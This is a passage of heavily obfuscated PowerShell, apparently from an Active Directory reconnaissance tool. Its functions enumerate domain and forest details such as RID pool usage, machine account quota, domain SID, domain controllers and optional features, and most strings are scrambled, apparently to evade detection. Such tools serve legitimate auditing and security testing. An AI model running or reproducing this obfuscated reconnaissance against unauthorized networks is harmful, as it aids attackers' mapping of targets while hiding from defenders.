                Write-Verbose ("{8}{5}{0}{2}{7}{3}{4}{1}{6}" -f 'DRDom','orest Conte','ain] Error','ti','ng F','A','xt',' get','[Get-')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If (-Not $ADForest)
            {
                Try
                {
                    $ADForest = Get-ADForest -Server $DomainController
                }
                Catch
                {
                    Write-Warning ("{7}{1}{6}{2}{3}{5}{4}{0}" -f'st Context','Get','RDomain] E','rror','tting Fore',' ge','-AD','[')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            If ($ADForest)
            {
                $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties ("{1}{3}{0}{2}" -f 'nC','w','reated','he')
                If (-Not $DomainCreation)
                {
                    $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties ("{0}{1}{2}" -f 'when','Create','d')
                }
                Remove-Variable ("{2}{1}{0}" -f 'Forest','D','A')
            }
            
            Try
            {
                $RIDManager = Get-ADObject -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) " -Properties ("{0}{2}{1}{3}"-f'rIDAv','oo','ailableP','l')
                $RIDproperty = $RIDManager."rI`da`V`AilaBLEpo`ol"
                [int32] $totalSIDS = $($RIDproperty) / ( (gEt-vARIabLe  gS39e).VaLUe::("{0}{1}"-f 'Po','w').Invoke(2,32))
                [int64] $temp64val = $totalSIDS * (  ( cHiLdIteM ("VARia"+"B"+"le:gs39e") ).vAlUE::("{0}{1}"-f 'Po','w').Invoke(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable ("{0}{3}{2}{1}"-f 'R','r','anage','IDM')
                Remove-Variable ("{1}{2}{0}"-f 'perty','R','IDpro')
                Remove-Variable ("{0}{1}"-f'totalS','IDS')
                Remove-Variable ("{0}{1}{3}{2}" -f'te','mp6','l','4va')
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($DomainCreation)
            {
                $Obj = New-Object ("{1}{0}"-f'Object','PS')
                $Obj | Add-Member -MemberType ("{2}{1}{3}{0}"-f'erty','ePr','Not','op') -Name ("{2}{0}{1}" -f'r','y','Catego') -Value ("{1}{2}{3}{0}" -f 'Date','Cr','eation',' ')
                $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'eProper','Not','ty') -Name ("{1}{0}"-f 'ue','Val') -Value $DomainCreation."wHEnc`REa`T`Ed"
                $DomainObj += $Obj
                Remove-Variable ("{2}{0}{3}{1}"-f 'nCr','ation','Domai','e')
            }

            $Obj = New-Object ("{1}{0}"-f'ject','PSOb')
            $Obj | Add-Member -MemberType ("{0}{1}{2}" -f'Not','eP','roperty') -Name ("{1}{0}" -f'ry','Catego') -Value ("{1}{0}{2}{4}{3}"-f '-DS-Machine','ms','Accoun','ta','tQuo')
            $Obj | Add-Member -MemberType ("{0}{3}{2}{1}"-f'Note','erty','p','Pro') -Name ("{0}{1}"-f'Va','lue') -Value $((Get-ADObject -Identity ($ADDomain."d`IST`iNgUiSh`edNA`mE") -Properties ("{0}{3}{5}{4}{1}{2}"-f 'ms','ineAccountQu','ota','-D','-Mach','S')).'ms-DS-MachineAccountQuota')
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object ("{0}{2}{1}" -f 'PSO','ject','b')
                $Obj | Add-Member -MemberType ("{0}{1}{3}{2}" -f 'NotePr','op','rty','e') -Name ("{2}{0}{1}"-f 'ateg','ory','C') -Value ("{1}{0}{2}" -f'D','RI','s Issued')
                $Obj | Add-Member -MemberType ("{2}{0}{1}{3}"-f'o','tePrope','N','rty') -Name ("{1}{0}" -f 'alue','V') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable ("{1}{2}{0}"-f 'd','R','IDsIssue')
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object ("{2}{1}{0}" -f 'ct','e','PSObj')
                $Obj | Add-Member -MemberType ("{0}{1}{2}{3}"-f 'No','tePr','ope','rty') -Name ("{1}{2}{0}" -f'ry','Cat','ego') -Value ("{1}{0}{2}" -f' Rema','RIDs','ining')
                $Obj | Add-Member -MemberType ("{2}{1}{0}"-f'y','ropert','NoteP') -Name ("{1}{0}"-f'lue','Va') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable ("{3}{2}{0}{4}{1}" -f 'Rem','g','IDs','R','ainin')
            }
        }
    }

    If ($Method -eq ("{1}{0}" -f'AP','LD'))
    {
        If ($Credential -ne   ( gEt-variABlE k49p -VA )::"EmP`TY")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."di`S`TingU`is`hedNamE")
            $DomainContext = New-Object ("{3}{8}{11}{2}{4}{14}{1}{12}{13}{10}{6}{5}{0}{9}{7}" -f'ryCont','ive','Se','System.Dir','rvices','irecto','tory.D','xt','ec','e','c','tory','Di','re','.Act')(("{1}{0}" -f'n','Domai'),$($DomainFQDN),$($Credential."Use`Rn`Ame"),$($Credential.("{1}{5}{4}{3}{2}{0}" -f'ntial','G','Crede','ork','etw','etN').Invoke()."p`AsSwO`Rd"))
            Try
            {
                $ADDomain =   (Gi  VaRiAbLE:IHyj8Z ).VAlUE::("{2}{0}{1}"-f 'Do','main','Get').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{2}{1}{3}{4}{6}{5}{7}{0}"-f 'text','AD','[Get-','RDom','ain] Erro','tting','r ge',' Domain Con')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ("{0}{2}{1}{4}{3}"-f 'Doma','n','i','ontext','C')
            
            Try
            {
                $SearchPath = ('CN=R'+'I'+'D '+"Manager$,CN=System")
                $objSearchPath = New-Object ("{2}{6}{4}{8}{3}{0}{5}{1}{7}"-f'ir','yEnt','Sy','ces.D','DirectorySe','ector','stem.','ry','rvi') "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", $Credential."USeRN`Ame",$Credential.("{3}{1}{5}{0}{2}{4}"-f 'Cr','e','e','GetN','dential','twork').Invoke()."p`ASSwo`Rd"
                $objSearcherPath = New-Object ("{0}{5}{2}{10}{3}{6}{8}{9}{1}{4}{7}" -f'S','ySear','r','ry','che','ystem.Di','Servic','r','es.Direct','or','ecto') $objSearchPath
                $objSearcherPath."P`RopE`RTIE`StOlOad".("{1}{0}{2}" -f'Ran','Add','ge').Invoke((("{0}{1}{4}{3}{5}{2}" -f 'r','idavaila','ool','e','bl','p')))
                $objSearcherResult = $objSearcherPath.("{0}{1}"-f'Fin','dAll').Invoke()
                $RIDproperty = $objSearcherResult."Pr`operti`eS"."rI`d`AVaIlabl`eP`OOl"
                [int32] $totalSIDS = $($RIDproperty) / ( ( vaRiablE  ('gs39'+'e') -vAlUeON  )::("{1}{0}" -f'ow','P').Invoke(2,32))
                [int64] $temp64val = $totalSIDS * ( (GET-vARIABle  GS39e -vALu)::("{1}{0}"-f'w','Po').Invoke(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable ("{0}{1}{2}"-f'SearchP','at','h')
                $objSearchPath.("{2}{0}{1}"-f'po','se','Dis').Invoke()
                $objSearcherPath.("{0}{1}"-f 'Dispo','se').Invoke()
                $objSearcherResult.("{1}{0}{2}"-f 'o','Disp','se').Invoke()
                Remove-Variable ("{3}{0}{1}{2}"-f 'Dpr','op','erty','RI')
                Remove-Variable ("{0}{2}{1}"-f 'totalS','S','ID')
                Remove-Variable ("{1}{2}{0}"-f'val','temp','64')
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            Try
            {
                $ForestContext = New-Object ("{3}{5}{15}{10}{0}{1}{17}{9}{11}{14}{8}{16}{6}{12}{4}{13}{2}{7}"-f'v','ic','ontex','System.D','irectory','irec','tory.','t','tiveDire','s','er','.','D','C','Ac','toryS','c','e')(("{0}{2}{1}" -f 'Fore','t','s'),$($ADDomain."Fo`Re`st"),$($Credential."USer`Na`ME"),$($Credential.("{1}{3}{4}{2}{0}{5}" -f 'd','GetNet','kCre','w','or','ential').Invoke()."PA`sSwOrD"))
                $ADForest =   $2gO::("{2}{0}{1}" -f'F','orest','Get').Invoke($ForestContext)
            }
            Catch
            {
                Write-Warning ("{10}{11}{6}{5}{8}{7}{2}{4}{9}{0}{3}{1}"-f 't','t','s','ex','t','E','ain] ','ng Fore','rror getti',' Con','[G','et-ADRDom')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ("{0}{1}{2}"-f'F','orestCo','ntext')
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.("{1}{0}{4}{5}{3}{2}" -f'ba','FindGlo','g','o','lCat','al').Invoke()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName ("{4}{2}{6}{5}{3}{0}{7}{1}" -f 'rector','try','ir','ices.Di','System.D','ctoryServ','e','yEn') -ArgumentList ($($DN),$($Credential."UsE`Rn`Ame"),$($Credential.("{1}{2}{3}{0}" -f'ial','GetNe','tworkCre','dent').Invoke()."PaSs`woRd"))
                    $ADDomainSID = New-Object ("{7}{5}{4}{6}{2}{0}{1}{3}"-f '.Secu','rity','al','Identifier','urity.','em.Sec','Princip','Syst')($ADObject."oB`Je`cTsiD"[0], 0)
                    $ADObject.("{0}{1}"-f'Dispos','e').Invoke()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object ("{0}{2}{7}{4}{3}{8}{6}{1}{5}" -f 'S','ntifi','y','urit','c','er','l.SecurityIde','stem.Se','y.Principa')($objDomain."O`BJEcTS`iD"[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object ("{12}{4}{3}{11}{9}{0}{6}{10}{1}{5}{2}{8}{7}"-f'.','t','I','u','tem.Sec','y','Secu','r','dentifie','ncipal','ri','rity.Pri','Sys')($objDomain."obJe`Ct`SId"[0], 0)
            }
        }
        Else
        {
            $ADDomain =   $IhyJ8z::("{0}{1}{4}{3}{2}"-f'GetCurr','en','n','ai','tDom').Invoke()
            $ADForest =   $2Go::("{0}{2}{3}{1}" -f'Get','est','Curr','entFor').Invoke()
            Try
            {
                $GlobalCatalog = $ADForest.("{3}{0}{2}{1}{5}{4}" -f'nd','ata','GlobalC','Fi','og','l').Invoke()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName ("{2}{6}{1}{3}{5}{7}{0}{4}" -f 'irectory','ry','Syst','S','Entry','ervice','em.Directo','s.D') -ArgumentList ($DN)
                $ADDomainSID = New-Object ("{11}{4}{8}{5}{3}{10}{9}{0}{12}{7}{2}{1}{6}"-f 'ncipa','ti','tyIden','uri','yst','.Sec','fier','Securi','em','ri','ty.P','S','l.')($ADObject."O`BjecT`sId"[0], 0)
                $ADObject.("{1}{2}{0}" -f 'se','di','spo').Invoke()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object ("{7}{0}{5}{1}{11}{8}{4}{6}{3}{9}{2}{10}"-f 't','Security.Princi','ie','nti','yId','em.','e','Sys','al.Securit','f','r','p')($objDomain."o`BjECT`SID"[0], 0)
            }
            
            Try
            {
                $RIDManager = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName) ")
                $RIDproperty = $ObjDomain.("{2}{6}{3}{0}{5}{4}{1}"-f 'Large','erToInt64','C','t','nteg','I','onver').Invoke($RIDManager."PRoPER`Ti`ES"."r`iD`AVa`I`la`BLEPOOl"."vAl`UE")
                [int32] $totalSIDS = $($RIDproperty) / (  (GET-iTem VaRiable:gS39E).ValuE::("{1}{0}" -f 'ow','P').Invoke(2,32))
                [int64] $temp64val = $totalSIDS * ( (gI vARIABle:gs39e ).VALUE::("{0}{1}"-f 'Po','w').Invoke(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable ("{1}{0}{2}"-f'DMan','RI','ager')
                Remove-Variable ("{1}{3}{2}{0}"-f'ty','R','per','IDpro')
                Remove-Variable ("{0}{1}{2}"-f 'to','talSI','DS')
                Remove-Variable ("{0}{1}"-f 'temp6','4val')
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($ADDomain)
        {
            $DomainObj = @()

            
            $FLAD = @{
	            0 = ("{2}{3}{0}{1}" -f 'dows2','000','Wi','n');
	            1 = ("{2}{0}{4}{1}{3}"-f 's','0','Window','03/Interim','2');
	            2 = ("{1}{0}{2}"-f 'ows','Wind','2003');
	            3 = ("{1}{2}{0}"-f'008','Win','dows2');
	            4 = ("{3}{2}{0}{1}"-f 'do','ws2008R2','n','Wi');
	            5 = ("{2}{1}{0}{3}" -f 'dows20','n','Wi','12');
	            6 = ("{0}{1}{2}" -f'Wi','ndows2','012R2');
	            7 = ("{1}{2}{3}{0}" -f'6','Windo','ws2','01')
            }
            $DomainMode = $FLAD[  (ITEM  ('VARiaBle'+':5'+'e97'+'4')).VaLuE::("{0}{1}" -f 'ToInt','32').Invoke($objDomainRootDSE."Dom`AINf`UnCti`OnALitY",10)] + ("{0}{1}" -f'Dom','ain')
            Remove-Variable ("{0}{1}"-f'F','LAD')

            $ObjValues = @(("{1}{0}" -f 'me','Na'), $ADDomain."na`Me", ("{1}{0}{2}" -f'B','Net','IOS'), $objDomain."d`c"."v`ALue", ("{2}{1}{0}{4}{3}"-f'tio','c','Fun','vel','nal Le'), $DomainMode, ("{1}{0}{2}"-f 'SI','Domain','D'), $ADDomainSID."vAl`UE")

            For ($i = 0; $i -lt $($ObjValues."co`UNt"); $i++)
            {
                $Obj = New-Object ("{1}{0}"-f 'bject','PSO')
                $Obj | Add-Member -MemberType ("{0}{1}{2}" -f'NoteP','ro','perty') -Name ("{0}{1}" -f'Ca','tegory') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType ("{0}{3}{1}{2}" -f'No','ert','y','teProp') -Name ("{0}{1}" -f 'V','alue') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable ("{0}{1}{3}{2}"-f 'D','om','inMode','a')

            For($i=0; $i -lt $ADDomain."Do`m`A`inConTRolLerS"."cOu`NT"; $i++)
            {
                $Obj = New-Object ("{1}{2}{0}" -f 'ect','PSOb','j')
                $Obj | Add-Member -MemberType ("{2}{3}{1}{0}"-f 'perty','ePro','N','ot') -Name ("{2}{1}{0}"-f 'y','gor','Cate') -Value ("{0}{2}{1}{3}" -f'Domain Contr','e','oll','r')
                $Obj | Add-Member -MemberType ("{1}{3}{0}{2}"-f'per','NoteP','ty','ro') -Name ("{1}{0}" -f'ue','Val') -Value $ADDomain."DO`mAInCOnTr`oL`leRs"[$i]
                $DomainObj += $Obj
            }

            $Obj = New-Object ("{1}{0}" -f 'ect','PSObj')
            $Obj | Add-Member -MemberType ("{3}{1}{2}{0}"-f'ty','p','er','NotePro') -Name ("{0}{1}" -f 'Ca','tegory') -Value ("{2}{0}{1}{3}"-f'ati','on D','Cre','ate')
            $Obj | Add-Member -MemberType ("{1}{2}{0}{3}" -f 'Prope','Not','e','rty') -Name ("{0}{1}"-f 'V','alue') -Value $objDomain."WHE`N`cr`eaTED"."v`ALuE"
            $DomainObj += $Obj

            $Obj = New-Object ("{0}{1}" -f 'PSObje','ct')
            $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'ePro','Not','perty') -Name ("{1}{0}" -f 'ry','Catego') -Value ("{0}{5}{1}{4}{6}{2}{3}"-f'ms-D','eAcc','ot','a','o','S-Machin','untQu')
            $Obj | Add-Member -MemberType ("{1}{2}{0}" -f 'erty','Not','eProp') -Name ("{1}{0}"-f 'alue','V') -Value $objDomain.'ms-DS-MachineAccountQuota'."V`Alue"
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object ("{1}{2}{0}"-f'ect','PS','Obj')
                $Obj | Add-Member -MemberType ("{1}{2}{0}"-f'ty','N','oteProper') -Name ("{1}{0}{2}" -f 'g','Cate','ory') -Value ("{1}{2}{0}{3}"-f ' ','RI','Ds','Issued')
                $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'r','NoteP','operty') -Name ("{0}{1}" -f 'Val','ue') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable ("{0}{1}{2}" -f'RI','DsIss','ued')
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object ("{1}{0}"-f 'SObject','P')
                $Obj | Add-Member -MemberType ("{3}{2}{1}{0}" -f'rty','ePrope','ot','N') -Name ("{0}{1}" -f 'Ca','tegory') -Value ("{2}{1}{0}"-f'ng','maini','RIDs Re')
                $Obj | Add-Member -MemberType ("{1}{2}{0}"-f'ty','NoteProp','er') -Name ("{0}{1}"-f 'V','alue') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable ("{1}{3}{0}{2}" -f'a','RIDsR','ining','em')
            }
        }
    }

    If ($DomainObj)
    {
        Return $DomainObj
    }
    Else
    {
        Return $null
    }
}

Function ge`T-ADR`FO`ReST
{

    param(
        [Parameter(maNdAtOry = $true)]
        [string] $Method,

        [Parameter(MAnDAtOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mANdATORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(MAnDaTory = $false)]
        [string] $DomainController,

        [Parameter(MaNDAtORY = $false)]
        [Management.Automation.PSCredential] $Credential =   $k49p::"E`MPTy"
    )

    If ($Method -eq ("{0}{1}"-f'AD','WS'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{6}{9}{2}{0}{8}{4}{7}{3}{1}{5}" -f 'DRF','main Contex','et-A',' Do','Error gettin','t','[','g','orest] ','G')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADForest = Get-ADForest $ADDomain."F`Orest"
        }
        Catch
        {
            Write-Verbose ("{2}{1}{5}{7}{6}{3}{0}{4}"-f'Co','RForest] Error g','[Get-AD','st ','ntext','et','Fore','ting ')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Remove-Variable ("{0}{1}{2}"-f'ADDo','m','ain')

        If (-Not $ADForest)
        {
            Try
            {
                $ADForest = Get-ADForest -Server $DomainController
            }
            Catch
            {
                Write-Warning ("{12}{14}{5}{13}{9}{8}{4}{7}{16}{10}{6}{2}{17}{1}{0}{11}{15}{3}"-f 'rve','ing Se','xt ','meter','r ge','ores','te','ttin','o','] Err','rest Con','r','[Get','t','-ADRF',' para','g Fo','us')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }

        If ($ADForest)
        {
            
            Try
            {
                $ADForestCNC = (Get-ADRootDSE)."confIgurAtIOnnAMIN`G`c`o`N`TExt"
                $ADForestDSCP = Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC) " -Partition $ADForestCNC -Properties ('*')
                $ADForestTombstoneLifetime = $ADForestDSCP."TO`Mb`STo`NElIFEtiME"
                Remove-Variable ("{1}{2}{0}" -f 'NC','ADFor','estC')
                Remove-Variable ("{2}{1}{3}{0}" -f 'P','DFo','A','restDSC')
            }
            Catch
            {
                Write-Warning ("{1}{5}{8}{6}{3}{0}{2}{7}{4}" -f'trieving Tombstone Lif','[Get-ADR','e','t] Error re','e','F','es','tim','or')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            
            If ( (  geT-CHildITeM ("var"+"ia"+"Ble"+":5E974")  ).ValUE::("{1}{0}"-f'2','ToInt3').Invoke($ADForest."F`ORE`sTmODE") -ge 6)
            {
                Try
                {
                    $ADRecycleBin = Get-ADOptionalFeature -Identity ("{1}{2}{5}{4}{3}{0}"-f'e','R','ecycle Bin','ur','eat',' F')
                }
                Catch
                {
                    Write-Warning ("{7}{4}{1}{13}{10}{2}{11}{0}{5}{9}{6}{3}{8}{12}"-f 'ecycl','st] E','ev','Fe','et-ADRFore','e','in ','[G','at',' B',' retri','ing R','ure','rror')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            
            If (  (  gEt-item VARIABLe:5E974 ).VAlue::("{0}{1}"-f 'To','Int32').Invoke($ADForest."FOResT`m`OdE") -ge 7)
            {
                Try
                {
                    $PrivilegedAccessManagement = Get-ADOptionalFeature -Identity ("{3}{0}{4}{9}{5}{2}{1}{7}{8}{6}" -f'ile','c','c','Priv','g','d A','ment Feature','ess Manag','e','e')
                }
                Catch
                {
                    Write-Warning ("{4}{14}{5}{10}{8}{1}{15}{6}{3}{12}{7}{2}{13}{9}{0}{11}"-f't','re','ceess',' ','[Get','Forest','ivileged','c','rror ','nagement Fea','] E','ure','A',' Ma','-ADR','trieving Pr')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            $ForestObj = @()

            
            $FLAD = @{
                0 = ("{1}{2}{0}"-f 'ws2000','Win','do');
                1 = ("{4}{1}{2}{3}{0}"-f'm','w','s2003/','Interi','Windo');
                2 = ("{3}{1}{0}{2}" -f 'ws200','indo','3','W');
                3 = ("{0}{3}{1}{2}" -f 'Win','0','8','dows20');
                4 = ("{3}{1}{2}{0}" -f'2','ows','2008R','Wind');
                5 = ("{0}{1}{2}"-f'Win','dows20','12');
                6 = ("{1}{0}{2}" -f 'indows2012','W','R2');
                7 = ("{1}{0}{2}" -f'1','Windows20','6')
            }
            $ForestMode = $FLAD[ ( vAriABlE  5E974 -vALuEoN  )::("{1}{0}" -f'32','ToInt').Invoke($ADForest."f`oreS`Tmo`DE")] + ("{1}{2}{0}"-f 'rest','F','o')
            Remove-Variable ("{1}{0}"-f 'D','FLA')

            If (-Not $ForestMode)
            {
                $ForestMode = $ADForest."fORE`sTmo`De"
            }

            $ObjValues = @(("{0}{1}" -f'N','ame'), $ADForest."NA`mE", ("{1}{3}{2}{0}{4}" -f'L','Funct','l ','iona','evel'), $ForestMode, ("{1}{3}{0}{2}" -f ' M','D','aster','omain Naming'), $ADForest."Dom`AI`Nn`AmiNGM`AsTer", ("{0}{2}{1}" -f 'Sc','r','hema Maste'), $ADForest."SCHEM`AMaSt`er", ("{1}{2}{0}"-f 'n','Root','Domai'), $ADForest."rOot`d`Oma`In", ("{1}{2}{0}"-f'ain Count','Do','m'), $ADForest."DO`MA`INS"."Co`UNt", ("{1}{0}{3}{2}"-f 'i','S','t','te Coun'), $ADForest."s`ITeS"."Co`Unt", ("{2}{0}{1}{4}{3}{5}"-f 'b','al Catalo','Glo',' Co','g','unt'), $ADForest."gl`O`BaLCa`TalOGS"."cO`UNT")

            For ($i = 0; $i -lt $($ObjValues."Cou`NT"); $i++)
            {
                $Obj = New-Object ("{1}{2}{0}" -f't','PSO','bjec')
                $Obj | Add-Member -MemberType ("{0}{1}{2}" -f 'NotePro','pe','rty') -Name ("{1}{2}{0}"-f 'egory','Ca','t') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType ("{0}{3}{1}{2}"-f'No','eProper','ty','t') -Name ("{0}{1}" -f'Val','ue') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ("{3}{1}{0}{2}" -f'd','estMo','e','For')

            For($i=0; $i -lt $ADForest."Do`Ma`iNS"."COu`NT"; $i++)
            {
                $Obj = New-Object ("{0}{1}{2}"-f 'PS','Ob','ject')
                $Obj | Add-Member -MemberType ("{2}{0}{1}{3}" -f'ote','Prope','N','rty') -Name ("{0}{2}{1}"-f 'C','ry','atego') -Value ("{0}{1}"-f'Do','main')
                $Obj | Add-Member -MemberType ("{2}{0}{1}" -f 'ert','y','NoteProp') -Name ("{1}{0}"-f'ue','Val') -Value $ADForest."DOm`AiNS"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."S`iTES"."C`ouNT"; $i++)
            {
                $Obj = New-Object ("{2}{0}{1}" -f'b','ject','PSO')
                $Obj | Add-Member -MemberType ("{2}{1}{0}" -f 'y','opert','NotePr') -Name ("{2}{0}{1}" -f 'g','ory','Cate') -Value ("{0}{1}"-f 'Sit','e')
                $Obj | Add-Member -MemberType ("{2}{0}{1}{3}" -f 't','eProper','No','ty') -Name ("{0}{1}" -f 'V','alue') -Value $ADForest."SiT`ES"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."glob`A`lcA`T`ALOgs"."c`ount"; $i++)
            {
                $Obj = New-Object ("{1}{0}{2}"-f 'bje','PSO','ct')
                $Obj | Add-Member -MemberType ("{3}{0}{2}{1}"-f'p','y','ert','NotePro') -Name ("{1}{0}"-f 'tegory','Ca') -Value ("{0}{3}{2}{1}"-f'GlobalCat','g','o','al')
                $Obj | Add-Member -MemberType ("{3}{2}{1}{0}"-f'perty','Pro','e','Not') -Name ("{1}{0}" -f 'ue','Val') -Value $ADForest."GlOBALC`ATal`o`gs"[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object ("{1}{0}{2}" -f 'b','PSO','ject')
            $Obj | Add-Member -MemberType ("{0}{1}{2}"-f 'Note','Prop','erty') -Name ("{0}{1}" -f 'Ca','tegory') -Value ("{2}{0}{4}{1}{3}"-f'bstone ','im','Tom','e','Lifet')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType ("{3}{2}{1}{0}" -f'erty','Prop','te','No') -Name ("{0}{1}" -f'V','alue') -Value $ADForestTombstoneLifetime
                Remove-Variable ("{5}{1}{3}{2}{6}{4}{7}{0}"-f 'e','or','ombs','estT','neLi','ADF','to','fetim')
            }
            Else
            {
                $Obj | Add-Member -MemberType ("{0}{1}{2}{3}"-f 'No','teP','ropert','y') -Name ("{0}{1}"-f'Val','ue') -Value ("{1}{2}{4}{3}{0}"-f 'ved','N','ot Ret','ie','r')
            }
            $ForestObj += $Obj

            $Obj = New-Object ("{1}{0}{2}" -f'SObj','P','ect')
            $Obj | Add-Member -MemberType ("{0}{2}{1}"-f'NotePro','y','pert') -Name ("{1}{0}" -f 'y','Categor') -Value ("{1}{2}{7}{4}{5}{3}{0}{6}" -f'08 R2','Recycle',' Bi','0',' ','(2',' onwards)','n')
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin."ENa`Bl`eDs`CoP`es"."cO`UNt" -gt 0)
                {
                    $Obj | Add-Member -MemberType ("{3}{0}{1}{2}"-f 'oteProp','er','ty','N') -Name ("{1}{0}" -f'lue','Va') -Value ("{2}{1}{0}" -f'led','ab','En')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin."eNableDs`c`o`PES"."coU`NT"); $i++)
                    {
                        $Obj = New-Object ("{1}{2}{0}"-f 'bject','PS','O')
                        $Obj | Add-Member -MemberType ("{0}{2}{1}" -f 'N','perty','otePro') -Name ("{2}{1}{0}"-f'egory','t','Ca') -Value ("{1}{3}{2}{0}" -f 'pe','Enabl',' Sco','ed')
                        $Obj | Add-Member -MemberType ("{2}{0}{3}{1}" -f'ePrope','y','Not','rt') -Name ("{1}{0}"-f'e','Valu') -Value $ADRecycleBin."enAB`Led`sc`op`es"[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType ("{0}{2}{1}{3}"-f 'N','eProper','ot','ty') -Name ("{1}{0}"-f'e','Valu') -Value ("{2}{0}{1}"-f 'sable','d','Di')
                    $ForestObj += $Obj
                }
                Remove-Variable ("{3}{1}{2}{0}"-f 'in','yc','leB','ADRec')
            }
            Else
            {
                $Obj | Add-Member -MemberType ("{1}{0}{2}{3}" -f'r','NoteP','op','erty') -Name ("{0}{1}"-f'V','alue') -Value ("{1}{2}{0}" -f 'abled','Di','s')
                $ForestObj += $Obj
            }

            $Obj = New-Object ("{2}{0}{1}"-f 'jec','t','PSOb')
            $Obj | Add-Member -MemberType ("{1}{0}{2}" -f 't','No','eProperty') -Name ("{1}{0}"-f 'ategory','C') -Value (("{2}{4}{5}{0}{7}{6}{3}{1}"-f 'd Access','ards)','Pri','(2016 onw','v','ilege','gement ',' Mana'))
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement."E`NaB`lEd`sCOpES"."CO`Unt" -gt 0)
                {
                    $Obj | Add-Member -MemberType ("{3}{1}{2}{0}" -f 'y','Prop','ert','Note') -Name ("{1}{0}"-f 'e','Valu') -Value ("{0}{1}" -f 'Enabl','ed')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement."enA`BLedS`cOpes"."C`OUNt"); $i++)
                    {
